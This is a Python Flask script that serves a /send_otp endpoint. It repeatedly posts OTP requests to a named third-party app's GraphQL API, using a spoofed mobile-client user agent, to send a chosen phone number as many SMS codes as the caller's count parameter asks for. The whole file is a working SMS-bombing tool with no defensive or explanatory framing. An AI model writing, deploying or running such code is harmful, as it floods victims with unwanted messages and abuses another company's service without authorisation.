from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

def sendMessage(number):
    headers = {
        "User-Agent": "Dart/3.1 (dart:io)",
        "Accept": "application/json",
        "Lang": "en",
        "Accept-Encoding": "gzip",
        "Content-Length": "96",
        "Host": "app.tagaddod.com",
        "Content-Type": "application/json; charset=utf-8"
    }

    data = f'{{"operationName":"","variables":{{}},"query":"mutation{{\\nsendOTP(phone: \\"{number}\\")\\n}}"}}'

    response = requests.post('https://app.tagaddod.com/graphql', headers=headers, data=data).text
    if "You will receive SMS with your OTP" in response:
        return "done"
    else:
        return "error"

@app.route('/send_otp', methods=['GET'])
def send_otp():
    try:
        number = request.args.get('number')
        count = request.args.get('count')
        for i in range(int(count)-1):
            sendMessage(number)
        result = sendMessage(number)
        return jsonify({'status': result})
    except Exception as e:
        return jsonify({'status': 'error', 'error_message': str(e)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=81)
